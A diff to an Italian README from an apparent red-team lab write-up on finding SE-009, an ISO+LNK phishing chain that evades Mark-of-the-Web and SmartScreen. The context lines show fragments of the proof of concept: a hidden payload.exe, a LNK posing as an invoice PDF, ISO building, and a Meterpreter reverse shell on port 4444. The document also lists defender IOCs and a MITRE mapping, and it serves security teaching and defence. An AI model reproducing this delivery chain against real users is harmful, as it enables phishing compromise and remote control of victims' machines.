@@ -1,6 +1,6 @@
 > [English](README.en.md) | **Italiano**
 
-# ISO + LNK Delivery - Mark-of-the-Web Bypass Chain
+# ISO + LNK delivery - Mark-of-the-Web bypass chain
 
 > - **Fase:** Social Engineering - Payload Delivery via Container File (Post-Macro Kill)
 > - **Visibilita:** Media - il file ISO e analizzabile da sandbox avanzate, ma il bypass MotW elude SmartScreen e il blocco macro; i file LNK con parametri sospetti sono rilevabili da EDR con regole specifiche
@@ -13,7 +13,7 @@
 
 ---
 
-## Executive Summary
+## Executive summary
 
 Dopo che Microsoft ha bloccato le macro VBA di default per file con Mark-of-the-Web (luglio 2022), gli attaccanti hanno rapidamente adottato una nuova delivery chain basata su file container: ISO (immagine disco), IMG, e VHD. Il principio sfruttato e una lacuna nel modello di sicurezza Windows: quando un file ISO viene montato come drive virtuale, i file contenuti al suo interno non ereditano il Mark-of-the-Web dal file ISO padre. Questo significa che un payload o un LNK all'interno dell'ISO viene eseguito senza che SmartScreen o il blocco macro intervengano.
 
@@ -21,7 +21,7 @@ La catena documentata - file ISO contenente un LNK camuffato da documento e il p
 
 ---
 
-## ISO + LNK: Esecuzione Payload senza MotW
+## ISO + LNK: esecuzione payload senza MotW
 
 **ID Finding:** `SE-009` | **Severity:** `Critico`
 
@@ -29,7 +29,7 @@ La catena documentata - file ISO contenente un LNK camuffato da documento e il p
 
 Il laboratorio ha costruito una delivery chain completa: un file ISO contenente un LNK (shortcut Windows) con icona di documento PDF e un payload .exe nascosto (attributo hidden). Quando la vittima apre il file ISO, Windows lo monta come drive virtuale (es. `D:`). La vittima vede un apparente "Fattura.pdf" (in realta il LNK), lo apre, e il LNK esegue il payload nascosto. SmartScreen non interviene perche i file nel drive montato non hanno MotW.
 
-### PoC - Fase 1: Creazione Payload
+### PoC - fase 1: creazione payload
 
 ```Bash
 # Generazione payload
@@ -42,7 +42,7 @@ Final size of exe file: 7168 bytes
 Saved as: payload.exe
 ```
 
-### PoC - Fase 2: Preparazione Contenuto ISO
+### PoC - fase 2: preparazione contenuto ISO
 
 ```Bash
 # Creazione struttura directory per ISO
@@ -66,7 +66,7 @@ cp payload.exe /tmp/iso_build/
 # $lnk.Save()
 ```
 
-### PoC - Fase 3: Creazione Immagine ISO
+### PoC - fase 3: creazione immagine ISO
 
 ```Bash
 # Impostare attributo hidden sul payload
@@ -85,7 +85,7 @@ Max brk space used 0
 7168 extents written (14 MB)                                <-- ISO creato
 ```
 
-### PoC - Fase 4: Verifica Assenza MotW
+### PoC - fase 4: verifica assenza MotW
 
 ```Bash
 # Sulla macchina Windows, dopo il download del file ISO:
@@ -109,7 +109,7 @@ Get-Content : Could not open the alternate data stream 'Zone.Identifier'    <-- 
                                                                              <-- SE-009: bypass confermato
 ```
 
-### PoC - Fase 5: Esecuzione e Callback
+### PoC - fase 5: esecuzione e callback
 
 ```
 # La vittima fa doppio click su "Fattura_Q1_2026.pdf" (il LNK):
@@ -130,7 +130,7 @@ Server username: DESKTOP-LAB\mario.rossi
 
 ---
 
-## Esperienza di Laboratorio
+## Esperienza di laboratorio
 
 L'ambiente e stato configurato con Windows 10 22H2 senza gli aggiornamenti che propagano il MotW ai file montati, per simulare la finestra di vulnerabilita che ha caratterizzato il 2022-2023. Il primo tentativo ha utilizzato un ISO con solo il payload .exe visibile: la vittima vedeva chiaramente un eseguibile, rendendo l'attacco poco convincente. La seconda iterazione ha introdotto il file LNK con icona PDF e il payload con attributo hidden, ottenendo un risultato visivamente identico a un documento legittimo.
 
@@ -140,7 +140,7 @@ Un aspetto critico scoperto durante il test: l'estensione `.lnk` non e visibile 
 
 ---
 
-## Analisi Teorica: Il Modello MotW e i Suoi Limiti
+## Analisi teorica: il modello MotW e i suoi limiti
 
 Il Mark-of-the-Web e un meccanismo di sicurezza implementato come NTFS Alternate Data Stream (ADS) denominato `Zone.Identifier`. Quando un file viene scaricato da Internet (zona 3), Windows scrive un ADS con il ZoneId che indica la provenienza. SmartScreen, il blocco macro, e altre difese di Windows consultano questo flag per decidere se applicare restrizioni.
 
@@ -154,11 +154,11 @@ Questa lacuna e stata sfruttata sistematicamente nel 2022-2023 dai principali lo
 
 ---
 
-## Scenario Reale: Proiezione Post-Exploitation
+## Scenario reale: proiezione Post-Exploitation
 
 > Questa sezione descrive come questo finding si inserirebbe in un engagement reale.
 
-### Prospettiva Attaccante (Red Team)
+### Prospettiva attaccante (red team)
 
 **Punto di partenza:** reverse shell da ISO+LNK senza alert SmartScreen (SE-009).
 
@@ -182,7 +182,7 @@ Lateral Movement -> Domain Controller compromise
 
 **Impatto potenziale:** l'assenza di alert SmartScreen significa che l'attacco non genera log di sicurezza iniziali, ritardando la detection. In un'organizzazione con patching lento e senza EDR avanzato, il tempo medio di dwell time puo superare i 200 giorni (Mandiant M-Trends 2024).
 
-### Prospettiva Difensore (Blue Team)
+### Prospettiva difensore (blue team)
 
 **IOC da monitorare:**
 - Mount di file ISO/IMG/VHD da directory Downloads (Event ID Sysmon 12/13)
@@ -199,15 +199,15 @@ Lateral Movement -> Domain Controller compromise
 
 ## Mappatura MITRE ATT&CK
 
-| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
+| tattica | tecnica | id mitre | descrizione dell'azione |
 | :--- | :--- | :--- | :--- |
-| Resource Development | Develop Capabilities: Malware | `T1587.001` | Creazione delivery chain ISO + LNK + payload nascosto |
-| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | File ISO inviato come allegato o link di download |
-| Execution | User Execution: Malicious File | `T1204.002` | La vittima monta l'ISO e clicca il LNK camuffato da PDF (SE-009) |
-| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | I file nel drive montato non hanno MotW, SmartScreen non interviene |
-| Defense Evasion | Masquerading: Match Legitimate Name or Location | `T1036.005` | LNK con nome "Fattura_Q1_2026.pdf" e icona PDF |
-| Defense Evasion | Hide Artifacts: Hidden Files and Directories | `T1564.001` | Payload con attributo hidden nel filesystem ISO |
-| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter su porta 4444 |
+| resource development | develop capabilities: malware | `T1587.001` | creazione delivery chain iso + lnk + payload nascosto |
+| initial access | phishing: spearphishing attachment | `T1566.001` | file iso inviato come allegato o link di download |
+| execution | user execution: malicious file | `T1204.002` | la vittima monta l'iso e clicca il lnk camuffato da pdf (SE-009) |
+| defense evasion | subvert trust controls: mark-of-the-web bypass | `T1553.005` | i file nel drive montato non hanno motw, smartscreen non interviene |
+| defense evasion | masquerading: match legitimate name or location | `T1036.005` | lnk con nome "fattura_q1_2026.pdf" e icona pdf |
+| defense evasion | hide artifacts: hidden files and directories | `T1564.001` | payload con attributo hidden nel filesystem iso |
+| command and control | non-standard port | `T1571` | reverse tcp meterpreter su porta 4444 |
 
 ---
 
